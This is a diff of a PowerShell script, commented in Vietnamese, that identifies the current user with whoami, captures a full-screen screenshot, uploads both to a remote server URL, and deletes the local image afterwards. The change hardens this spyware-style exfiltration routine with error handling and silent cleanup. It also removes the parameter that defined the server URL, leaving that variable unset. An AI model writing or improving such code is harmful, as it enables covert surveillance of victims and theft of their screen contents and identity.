@@ -1,12 +1,8 @@
-param(
-    [string]$ServerUrl
-)
+# Đường dẫn lưu ảnh chụp màn hình
+$tempScreenshot = "$env:TEMP\screenshot.png"
 
 # Lấy tên máy
 $name = whoami
-
-# Đường dẫn tạm để lưu ảnh chụp màn hình
-$tempScreenshot = "$env:TEMP\screenshot.png"
 
 # Chụp ảnh màn hình
 Add-Type -AssemblyName System.Windows.Forms
@@ -18,15 +14,27 @@ $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
 $bitmap.Save($tempScreenshot, [System.Drawing.Imaging.ImageFormat]::Png)
 
-# Gửi dữ liệu về server
-$webClient = New-Object System.Net.WebClient
+# Kiểm tra biến $ServerUrl
+if (-not $ServerUrl) {
+    Write-Host "Server URL is not defined. Exiting."
+    exit
+}
 
 # Gửi tên máy
-$webClient.UploadString("$ServerUrl/name", $name)
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.UploadString("$ServerUrl/name", $name)
+} catch {
+    Write-Host "Error uploading name: $_"
+}
 
 # Gửi ảnh chụp màn hình
-$fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
-$webClient.UploadData("$ServerUrl/screenshot", $fileBytes)
+try {
+    $fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
+    $webClient.UploadData("$ServerUrl/screenshot", $fileBytes)
+} catch {
+    Write-Host "Error uploading screenshot: $_"
+}
 
-# Xoá ảnh chụp màn hình sau khi gửi
-Remove-Item $tempScreenshot
+# Xoá ảnh chụp màn hình
+Remove-Item $tempScreenshot -ErrorAction SilentlyContinue
